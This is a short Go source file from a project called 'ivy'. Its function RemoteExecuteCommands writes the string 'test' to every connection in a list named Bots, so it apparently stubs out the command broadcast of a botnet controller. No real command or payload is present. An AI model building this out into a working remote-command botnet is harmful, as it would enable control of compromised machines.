package commands

import (
	config "ivy/util/config"
)


/*
    *    util/commands/execute.go
    *    Date: 12/11/21
    *    Author: 0x80000000
*/


func RemoteExecuteCommands() {
	for i := 0; i < len(config.Bots); i++ {
		config.Bots[i].Write([]byte("test\n"))
	}
}